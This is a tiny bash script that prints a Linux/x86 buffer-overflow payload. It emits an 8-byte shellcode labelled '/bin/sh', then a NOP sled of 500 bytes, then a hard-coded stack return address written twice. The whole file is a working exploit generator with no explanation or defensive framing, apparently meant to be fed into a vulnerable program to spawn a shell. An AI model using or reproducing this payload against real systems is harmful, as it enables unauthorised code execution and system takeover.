#!/bin/bash

#Linux/x86 - /bin/sh - 8 bytes
#8 bytes
echo -ne "\x99\x6a\x0b\x58\x60\x59\xcd\x80"

for i in $(seq 9 508)
do
	echo -ne "\x90"
done

for i in 1 2
do
	echo -ne "\x6c\xd3\xff\xff"
done
